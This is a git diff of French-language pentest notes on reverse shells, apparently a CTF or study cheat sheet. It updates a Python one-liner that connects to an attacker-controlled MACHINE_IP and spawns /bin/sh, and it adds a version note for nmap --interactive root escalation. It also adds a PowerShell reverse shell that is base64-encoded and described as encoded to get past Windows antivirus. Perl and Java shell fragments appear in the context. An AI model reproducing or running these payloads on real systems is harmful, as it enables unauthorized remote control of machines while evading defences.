@@ -1,5 +1,6 @@
 
-Un reverse shell est un code à éxécuter sur une machine cible dans le but de pouvoir executer du code shell en elle.
+  
+Un reverse shell est un [[Shell]] entre une machine cible et la notre.
 
 ## __Setup Netcat Listener__
 
@@ -21,6 +22,7 @@ On peut ensuite utiliser **`su`** pour se connecter.
 
 ## __Nmap --interactive__
 
+**Seulement pour les version 2.02 à 5.21**
 Si notre utilisateur a les permissions d'utiliser nmap, on peut utiliser [nmap pour se connecter en root](https://gtfobins.github.io/gtfobins/nmap/#shell) sur notre shell, pour cela :
 
 ```shell
@@ -48,7 +50,7 @@ perl -e 'use Socket;$i="MACHINE_IP";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprot
 ### Python
 
 ```python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MACHINE_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MACHINE_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 ### Php
@@ -118,4 +120,12 @@ while(!s.isClosed()){
 };
 p.destroy();
 s.close();
+```
+
+### Powershell
+
+Ce shell est chiffré en [base64](Encryption_Chiffrement) car il est repéré par la plupart des antivirus windows. 
+
+```
+cG93ZXJzaGVsbCAtYyAiJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnPGlwPicsPHBvcnQ+KTskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX07JGNsaWVudC5DbG9zZSgpIg==
 ```
